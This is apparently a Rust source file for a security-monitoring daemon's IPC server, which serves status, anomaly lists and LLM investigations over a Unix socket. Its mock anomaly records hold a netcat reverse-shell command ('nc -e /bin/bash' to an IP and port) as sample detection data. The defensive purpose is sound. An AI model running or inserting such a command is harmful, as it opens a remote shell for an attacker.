use std::fs;
use std::path::Path;
use tokio::net::{UnixListener, UnixStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use sysrag_common::ipc::{DaemonRequest, DaemonResponse, AnomalyReport};

const SOCKET_PATH: &str = "/tmp/sysrag.sock"; // Use /var/run/sysrag.sock in production

/// Starts the IPC server in the background
pub async fn start_ipc_server() {
    // 1. Clean up the old socket file if the daemon crashed previously
    if Path::new(SOCKET_PATH).exists() {
        fs::remove_file(SOCKET_PATH).expect("Failed to remove old socket file");
    }

    // 2. Bind the listener to the socket path
    let listener = UnixListener::bind(SOCKET_PATH)
        .expect("Failed to bind to Unix Domain Socket");
    
    println!("IPC Server listening on {}", SOCKET_PATH);

    // 3. Enter the async infinite loop to accept connections
    loop {
        match listener.accept().await {
            Ok((stream, _addr)) => {
                // Spawn a new asynchronous task for every CLI command received
                // This ensures the daemon never blocks or slows down
                tokio::spawn(async move {
                    handle_client(stream).await;
                });
            }
            Err(e) => {
                eprintln!("Failed to accept connection: {}", e);
            }
        }
    }
}

/// Handles a single connection from the `sysrag` CLI
async fn handle_client(mut stream: UnixStream) {
    let mut buffer = vec![0; 4096]; // 4KB buffer for incoming requests

    // Read the incoming bytes from the CLI
    match stream.read(&mut buffer).await {
        Ok(size) if size > 0 => {
            // Parse the raw bytes into our exact Rust Enum using Serde
            let request_data = &buffer[..size];
            match serde_json::from_slice::<DaemonRequest>(request_data) {
                Ok(request) => {
                    println!("Received request from CLI: {:?}", request);
                    
                    // Route the request and generate a response
                    let response = process_request(request).await;
                    
                    // Serialize the response back to JSON and send it
                    let response_bytes = serde_json::to_vec(&response).unwrap();
                    if let Err(e) = stream.write_all(&response_bytes).await {
                        eprintln!("Failed to send response to CLI: {}", e);
                    }
                }
                Err(e) => {
                    eprintln!("Failed to parse JSON from CLI: {}", e);
                    let err_resp = DaemonResponse::Error("Invalid JSON payload".to_string());
                    let _ = stream.write_all(&serde_json::to_vec(&err_resp).unwrap()).await;
                }
            }
        }
        _ => {} // Connection closed or empty
    }
}

/// The brain of the server: matches the CLI request to daemon logic
async fn process_request(req: DaemonRequest) -> DaemonResponse {
    match req {
        DaemonRequest::Status => {
            // In a real app, you would fetch these from an Arc<Mutex<AppState>>
            DaemonResponse::StatusOk {
                uptime_seconds: 3600,
                events_processed: 15420,
                db_size: 1024,
            }
        }
        DaemonRequest::GetAnomalies { tail } => {
            // TODO: Fetch real anomalies from your VectorStore
            println!("CLI asked for the last {} anomalies", tail);
            
            // Mocking a response for now to prove the IPC works
            let mock_anomaly = AnomalyReport {
                id: "uuid-1234-5678".to_string(),
                timestamp: 1700000000,
                pid: 1337,
                command: "nc -e /bin/bash 10.0.0.5 4444".to_string(),
                similarity_score: 0.12,
                raw_log: "execve(/usr/bin/nc)".to_string(),
            };
            
            DaemonResponse::AnomaliesList(vec![mock_anomaly])
        }
        DaemonRequest::Investigate { id } => {
    // 1. Instantiate our unused LLM Analyzer!
    let analyzer = crate::llm::LlmAnalyzer::new();
    
    // 2. For the prototype, we will create a dummy AnomalyReport based on the ID 
    // (In production, you would fetch this by ID from the `anomalies_store` in main.rs)
    let context_anomaly = sysrag_common::ipc::AnomalyReport {
        id: id.clone(),
        timestamp: 1700000000,
        pid: 1337,
        command: "nc -e /bin/bash".to_string(),
        similarity_score: 0.12,
        raw_log: "execve: pid=1337 comm=nc".to_string(),
    };

    // 3. Pass the anomaly to the analyzer (this removes the 'never used' warnings!)
    let analysis_result = analyzer.analyze_anomaly(&context_anomaly).await
        .unwrap_or_else(|_| "LLM Analysis failed.".to_string());

    DaemonResponse::InvestigationResult(analysis_result)
    }
    }
}